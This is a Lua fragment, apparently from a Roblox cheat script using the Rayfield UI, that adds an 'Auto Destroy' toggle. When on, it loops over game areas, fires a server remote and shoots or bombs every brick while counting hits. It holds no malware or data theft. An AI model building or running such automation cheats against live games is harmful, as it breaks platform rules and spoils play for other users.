DestroyTab:CreateToggle({
    Name = "💥 Auto Destroy AN/AUS",
    CurrentValue = false,
    Flag = "AutoDestroy",
    Callback = function(value)
        Config.AutoDestroy = value
        if value then
            local launcher = getLauncher()
            if not launcher or not launcher.stats then
                Config.AutoDestroy = false
                Rayfield:Notify({ Title = "⚠️ Kein Launcher!", Content = "Du brauchst einen Launcher!", Duration = 4 })
                return
            end
            sessionStart = os.time()

            -- Get list of areas to destroy
            local function getAreaList()
                if allAreas then
                    local list = {}
                    for i = 1, 16 do table.insert(list, "Area" .. i) end
                    return list
                else
                    return {"Area" .. selectedArea}
                end
            end

            -- LAUNCHER THREAD
            destroyThreadLauncher = task.spawn(function()
                local loopCount = 0
                while Config.AutoDestroy do
                    loopCount += 1
                    local areas = getAreaList()

                    -- Fire each area in parallel
                    for _, areaName in ipairs(areas) do
                        task.spawn(function()
                            pcall(function() AreaRemote:FireServer(areaName) end)
                            local bricks = getBricksInArea(areaName)
                            for _, brick in ipairs(bricks) do
                                if not Config.AutoDestroy then break end
                                if brick and brick.Parent then
                                    pcall(function() shootAt(brick.Position) end)
                                    totalHits += 1
                                    hitsLabel:Set("💥 Total Hits: " .. totalHits)
                                    local elapsed = math.max(1, os.time() - sessionStart)
                                    kpmLabel:Set("⚡ Hits/Min: " .. math.floor((totalHits/elapsed)*60))
                                    task.wait(Config.Delay)
                                end
                            end
                        end)
                    end

                    statusLabel:Set("🚀 Launcher | Loop #" .. loopCount .. (allAreas and " | ALL AREAS" or " | Area" .. selectedArea))
                    task.wait(0.5)
                end
                destroyThreadLauncher = nil
            end)

            -- BOMB THREAD (only if nuke mode)
            if nukeMode then
                destroyThreadBomb = task.spawn(function()
                    local loopCount = 0
                    while Config.AutoDestroy do
                        loopCount += 1
                        local areas = getAreaList()

                        for _, areaName in ipairs(areas) do
                            task.spawn(function()
                                local bricks = getBricksInArea(areaName)
                                for _, brick in ipairs(bricks) do
                                    if not Config.AutoDestroy then break end
                                    if brick and brick.Parent then
                                        pcall(function() dropBombAt(brick.Position) end)
                                        task.wait(Config.Delay)
                                    end
                                end
                            end)
                        end

                        task.wait(0.5)
                    end
                    destroyThreadBomb = nil
                end)
            end

            Rayfield:Notify({
                Title = "💥 Auto Destroy ON",
                Content = (nukeMode and "🚀+💣 NUKE | " or "🚀 | ") .. (allAreas and "ALLE 16 AREAS!" or "Area" .. selectedArea),
                Duration = 3,
            })
        else
            Config.AutoDestroy = false
            destroyThreadLauncher = nil
            destroyThreadBomb = nil
            statusLabel:Set("Status: Inaktiv")
            Rayfield:Notify({ Title = "💥 Auto Destroy OFF", Content = "Gestoppt.", Duration = 2 })
        end
    end,
})

